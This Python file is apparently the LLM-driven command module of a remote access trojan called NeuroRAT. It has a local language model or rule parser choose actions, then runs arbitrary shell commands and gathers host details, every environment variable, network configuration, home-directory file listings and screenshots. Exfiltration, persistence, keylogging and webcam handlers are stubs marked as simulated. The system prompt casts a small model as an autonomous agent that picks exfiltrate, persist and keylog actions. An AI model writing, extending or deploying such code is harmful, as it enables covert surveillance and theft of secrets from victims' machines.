#!/usr/bin/env python3
"""
LLM Processor for NeuroRAT Agent
Provides local inference capabilities for autonomous operation without server connection.
"""

import os
import sys
import time
import json
import logging
import subprocess
import threading
import platform
import tempfile
import re
from typing import Dict, Any, List, Optional, Union, Callable, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('llm_processor.log')
    ]
)
logger = logging.getLogger('llm_processor')

class LLMProcessor:
    """
    LLM processor for autonomous operation of the NeuroRAT agent.
    """
    
    def __init__(self, use_local_model: bool = True, api_key: Optional[str] = None):
        """
        Initialize the LLM processor.
        
        Args:
            use_local_model: Whether to use a local model (if available)
            api_key: API key for remote model service (if local model not used)
        """
        self.use_local_model = use_local_model
        self.api_key = api_key
        
        # Execution history
        self.execution_history = []
        
        # Command handlers
        self.command_handlers = {
            "collect": self._handle_collect_command,
            "execute": self._handle_execute_command,
            "analyze": self._handle_analyze_command,
            "exfiltrate": self._handle_exfiltrate_command,
            "persist": self._handle_persist_command,
            "keylog": self._handle_keylog_command,
            "screenshot": self._handle_screenshot_command,
            "webcam": self._handle_webcam_command,
            "network": self._handle_network_command,
            "scan": self._handle_scan_command
        }
        
        # Check for local model availability
        self.local_model_available = self._check_local_model()
        if use_local_model and not self.local_model_available:
            logger.warning("Local LLM model requested but not available, will use fallback parsing")
    
    def _check_local_model(self) -> bool:
        """Check if a local LLM model is available."""
        try:
            # Try importing transformers
            import importlib.util
            has_transformers = importlib.util.find_spec("transformers") is not None
            has_torch = importlib.util.find_spec("torch") is not None
            
            return has_transformers and has_torch
        except:
            return False
    
    def process_query(self, query: str, context: Dict[str, Any] = None, 
                     is_autonomous: bool = False) -> Dict[str, Any]:
        """
        Process a query using LLM capabilities.
        
        Args:
            query: The query or command to process
            context: Additional context for the query
            is_autonomous: Whether the agent should act autonomously
            
        Returns:
            Dictionary with results and actions
        """
        start_time = time.time()
        logger.info(f"Processing query: {query}")
        
        context = context or {}
        result = {
            "processed": True,
            "execution_time": 0,
            "autonomous": is_autonomous,
            "actions": [],
            "output": "",
            "error": None
        }
        
        try:
            if self.use_local_model and self.local_model_available:
                processed_result = self._process_with_local_model(query, context, is_autonomous)
            else:
                # Fallback to rule-based processing
                processed_result = self._process_with_rules(query, context, is_autonomous)
            
            result.update(processed_result)
                
        except Exception as e:
            logger.error(f"Error processing query: {str(e)}")
            result["error"] = str(e)
            result["processed"] = False
        
        # Record execution time
        result["execution_time"] = time.time() - start_time
        
        # Add to history
        self.execution_history.append({
            "timestamp": time.time(),
            "query": query,
            "context": context,
            "result": result
        })
        
        return result
    
    def _process_with_local_model(self, query: str, context: Dict[str, Any], 
                                 is_autonomous: bool) -> Dict[str, Any]:
        """Process a query using a local LLM model."""
        try:
            from transformers import AutoModelForCausalLM, AutoTokenizer
            import torch
            
            # This would normally load a small model suitable for edge devices
            # For this example we're just showing the integration pattern
            model_name = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"  # A small model that could run on edge
            
            tokenizer = AutoTokenizer.from_pretrained(model_name)
            model = AutoModelForCausalLM.from_pretrained(model_name)
            
            system_prompt = """You are an autonomous security agent. Parse the command and respond with a JSON object 
            containing the actions to take. Valid actions include:
            - collect: Gather information from the system
            - execute: Run a shell command
            - analyze: Analyze collected data
            - exfiltrate: Send data to the server
            - persist: Establish persistence
            - keylog: Set up a keylogger
            - screenshot: Take a screenshot
            - webcam: Access the webcam
            - network: Network operations
            - scan: Network scanning
            """
            
            # Format context as string
            context_str = json.dumps(context) if context else ""
            
            # Create prompt
            prompt = f"{system_prompt}\n\nCommand: {query}\nContext: {context_str}\n\nResponse:"
            
            # Tokenize and generate
            inputs = tokenizer(prompt, return_tensors="pt")
            with torch.no_grad():
                outputs = model.generate(
                    inputs["input_ids"],
                    max_length=512,
                    temperature=0.7,
                    top_p=0.9
                )
            
            response = tokenizer.decode(outputs[0], skip_special_tokens=True)
            
            # Extract JSON from response
            json_match = re.search(r'\{.*\}', response, re.DOTALL)
            if json_match:
                json_str = json_match.group(0)
                actions = json.loads(json_str)
                
                # Execute actions
                return self._execute_actions(actions, is_autonomous)
            else:
                return {
                    "output": "Failed to parse LLM response",
                    "actions": []
                }
            
        except Exception as e:
            logger.error(f"Error using local model: {str(e)}")
            # Fall back to rule-based processing
            return self._process_with_rules(query, context, is_autonomous)
    
    def _process_with_rules(self, query: str, context: Dict[str, Any], 
                           is_autonomous: bool) -> Dict[str, Any]:
        """Process a query using rule-based parsing."""
        actions = []
        output = ""
        
        # Simple command parsing
        lines = query.strip().split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Check for command pattern: action: parameters
            if ':' in line:
                action, params = line.split(':', 1)
                action = action.strip().lower()
                params = params.strip()
                
                if action in self.command_handlers:
                    actions.append({
                        "type": action,
                        "parameters": params
                    })
                else:
                    output += f"Unknown action: {action}\n"
            else:
                # Assume it's a shell command
                actions.append({
                    "type": "execute",
                    "parameters": line
                })
        
        # Execute actions if autonomous
        if actions:
            return self._execute_actions({"actions": actions}, is_autonomous)
        else:
            return {
                "output": "No valid actions found in query",
                "actions": []
            }
    
    def _execute_actions(self, actions_data: Dict[str, Any], is_autonomous: bool) -> Dict[str, Any]:
        """Execute parsed actions."""
        results = []
        output = ""
        
        # Get actions list
        actions_list = actions_data.get("actions", [])
        
        for action in actions_list:
            action_type = action.get("type")
            parameters = action.get("parameters", "")
            
            # Record the action
            action_record = {
                "type": action_type,
                "parameters": parameters,
                "executed": is_autonomous,
                "result": None,
                "error": None
            }
            
            # Execute the action if autonomous mode is enabled
            if is_autonomous and action_type in self.command_handlers:
                try:
                    result = self.command_handlers[action_type](parameters)
                    action_record["result"] = result
                    output += f"Executed {action_type}: {result.get('output', '')}\n"
                except Exception as e:
                    error_msg = str(e)
                    action_record["error"] = error_msg
                    output += f"Error executing {action_type}: {error_msg}\n"
            elif not is_autonomous:
                output += f"Action {action_type} queued (not executed in non-autonomous mode)\n"
            
            results.append(action_record)
        
        return {
            "actions": results,
            "output": output
        }
    
    def _handle_collect_command(self, parameters: str) -> Dict[str, Any]:
        """Handle collection of system information."""
        result = {
            "output": "",
            "data": {}
        }
        
        # Determine what to collect
        if "system" in parameters:
            # Collect system info
            system_info = {
                "os": platform.system(),
                "os_release": platform.release(),
                "hostname": platform.node(),
                "processor": platform.processor(),
                "architecture": platform.machine(),
                "python_version": platform.python_version()
            }
            result["data"]["system"] = system_info
            result["output"] += "Collected system information\n"
            
        if "user" in parameters:
            # Collect user info
            try:
                username = os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME')
                home_dir = os.path.expanduser("~")
                
                user_info = {
                    "username": username,
                    "home_directory": home_dir,
                    "environment_vars": dict(os.environ)
                }
                result["data"]["user"] = user_info
                result["output"] += "Collected user information\n"
            except Exception as e:
                result["output"] += f"Error collecting user info: {str(e)}\n"
                
        if "network" in parameters:
            # Collect network info
            try:
                import socket
                hostname = socket.gethostname()
                
                # Get IP address
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(('10.255.255.255', 1))
                    ip_address = s.getsockname()[0]
                except:
                    ip_address = '127.0.0.1'
                finally:
                    s.close()
                    
                network_info = {
                    "hostname": hostname,
                    "ip_address": ip_address
                }
                
                # Try to get more detailed network info using commands
                if platform.system() == "Windows":
                    try:
                        ipconfig = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
                        network_info["ipconfig"] = ipconfig
                    except:
                        pass
                else:
                    try:
                        ifconfig = subprocess.check_output("ifconfig", shell=True).decode('utf-8', errors='ignore')
                        network_info["ifconfig"] = ifconfig
                    except:
                        try:
                            ip_addr = subprocess.check_output("ip addr", shell=True).decode('utf-8', errors='ignore')
                            network_info["ip_addr"] = ip_addr
                        except:
                            pass
                
                result["data"]["network"] = network_info
                result["output"] += "Collected network information\n"
            except Exception as e:
                result["output"] += f"Error collecting network info: {str(e)}\n"
        
        if "files" in parameters:
            # Collect files info
            try:
                # Get path to scan (default to home directory)
                path_match = re.search(r'files:([^\s]+)', parameters)
                path = path_match.group(1) if path_match else os.path.expanduser("~")
                
                files = []
                for root, dirs, filenames in os.walk(path, topdown=True, onerror=None, followlinks=False):
                    dirs[:] = dirs[:3]  # Limit directory recursion
                    for filename in filenames[:20]:  # Limit files per directory
                        file_path = os.path.join(root, filename)
                        try:
                            file_info = {
                                "name": filename,
                                "path": file_path,
                                "size": os.path.getsize(file_path),
                                "modified": os.path.getmtime(file_path)
                            }
                            files.append(file_info)
                        except:
                            continue
                    
                    if len(files) >= 100:  # Limit total files
                        break
                
                result["data"]["files"] = files
                result["output"] += f"Collected information about {len(files)} files\n"
            except Exception as e:
                result["output"] += f"Error collecting files info: {str(e)}\n"
                
        return result
    
    def _handle_execute_command(self, parameters: str) -> Dict[str, Any]:
        """Handle execution of shell commands."""
        result = {
            "output": "",
            "exit_code": None
        }
        
        try:
            # Execute the command
            process = subprocess.run(
                parameters,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30  # Timeout after 30 seconds
            )
            
            result["output"] = process.stdout
            if process.stderr:
                result["output"] += "\n" + process.stderr
                
            result["exit_code"] = process.returncode
            
        except subprocess.TimeoutExpired:
            result["output"] = "Command timed out after 30 seconds"
            result["exit_code"] = -1
        except Exception as e:
            result["output"] = f"Error executing command: {str(e)}"
            result["exit_code"] = -1
            
        return result
    
    def _handle_analyze_command(self, parameters: str) -> Dict[str, Any]:
        """Handle analysis of collected data."""
        # In a real implementation, this would analyze data using local algorithms
        return {
            "output": "Analysis performed (simulated)",
            "findings": ["Simulated finding 1", "Simulated finding 2"]
        }
    
    def _handle_exfiltrate_command(self, parameters: str) -> Dict[str, Any]:
        """Handle data exfiltration (this would normally send data back to C2)."""
        # In a real implementation, this would package and send data to the C2 server
        return {
            "output": "Data exfiltration simulated",
            "size": "1.2 KB"
        }
    
    def _handle_persist_command(self, parameters: str) -> Dict[str, Any]:
        """Handle persistence establishment."""
        # This would establish persistence based on the system
        system = platform.system()
        
        if "check" in parameters.lower():
            # Just check persistence options without implementing
            return {
                "output": f"Persistence options for {system}:\n" +
                         ("Registry, Scheduled Tasks, Startup Folder\n" if system == "Windows" else
                          "Cron Jobs, Systemd Services, RC Scripts, .bashrc\n" if system == "Linux" else
                          "Launch Agents, Launch Daemons, Login Items\n")
            }
        
        # In a real implementation, this would establish actual persistence
        return {
            "output": f"Persistence establishment simulated for {system}",
            "method": "registry" if system == "Windows" else "cron" if system == "Linux" else "launch_agent"
        }
    
    def _handle_keylog_command(self, parameters: str) -> Dict[str, Any]:
        """Handle keylogging operations."""
        # In a real implementation, this would set up a keylogger
        return {
            "output": "Keylogger simulation started",
            "status": "running"
        }
    
    def _handle_screenshot_command(self, parameters: str) -> Dict[str, Any]:
        """Handle screenshot capture."""
        try:
            # Try to import required modules
            try:
                from PIL import ImageGrab
                import base64
                from io import BytesIO
                
                # Take screenshot
                screenshot = ImageGrab.grab()
                
                # Save to a temporary file
                temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
                screenshot.save(temp_file.name)
                temp_file.close()
                
                return {
                    "output": f"Screenshot captured and saved to {temp_file.name}",
                    "file_path": temp_file.name
                }
            except ImportError:
                return {
                    "output": "Screenshot failed: PIL module not available",
                    "error": "Missing dependencies"
                }
        except Exception as e:
            return {
                "output": f"Screenshot failed: {str(e)}",
                "error": str(e)
            }
    
    def _handle_webcam_command(self, parameters: str) -> Dict[str, Any]:
        """Handle webcam operations."""
        # In a real implementation, this would access the webcam
        return {
            "output": "Webcam access simulated",
            "status": "success"
        }
    
    def _handle_network_command(self, parameters: str) -> Dict[str, Any]:
        """Handle network operations."""
        if "listen" in parameters:
            port_match = re.search(r'port[=:](\d+)', parameters)
            port = int(port_match.group(1)) if port_match else 8080
            
            return {
                "output": f"Network listener simulated on port {port}",
                "port": port
            }
        elif "connect" in parameters:
            host_match = re.search(r'host[=:]([^\s]+)', parameters)
            port_match = re.search(r'port[=:](\d+)', parameters)
            
            host = host_match.group(1) if host_match else "localhost"
            port = int(port_match.group(1)) if port_match else 80
            
            return {
                "output": f"Network connection simulated to {host}:{port}",
                "host": host,
                "port": port
            }
        else:
            return {
                "output": "Unknown network operation",
                "error": "Invalid parameters"
            }
    
    def _handle_scan_command(self, parameters: str) -> Dict[str, Any]:
        """Handle scanning operations."""
        if "port" in parameters:
            host_match = re.search(r'host[=:]([^\s]+)', parameters)
            port_match = re.search(r'port[=:](\d+)', parameters)
            
            host = host_match.group(1) if host_match else "localhost"
            port = int(port_match.group(1)) if port_match else 80
            
            # In a real implementation, this would perform a port scan
            return {
                "output": f"Port scan simulated for {host}:{port}",
                "host": host,
                "port": port,
                "status": "open"
            }
        elif "network" in parameters:
            # In a real implementation, this would scan the network
            return {
                "output": "Network scan simulated",
                "hosts_found": ["192.168.1.1", "192.168.1.2"]
            }
        else:
            return {
                "output": "Unknown scan type",
                "error": "Invalid parameters"
            }
            
    def get_history(self) -> List[Dict[str, Any]]:
        """Get the execution history."""
        return self.execution_history
    
    def clear_history(self) -> None:
        """Clear the execution history."""
        self.execution_history = []


if __name__ == "__main__":
    # Test the LLM processor with a sample query
    processor = LLMProcessor()
    result = processor.process_query("collect: system\nexecute: ls -la", {}, True)
    print(json.dumps(result, indent=2)) 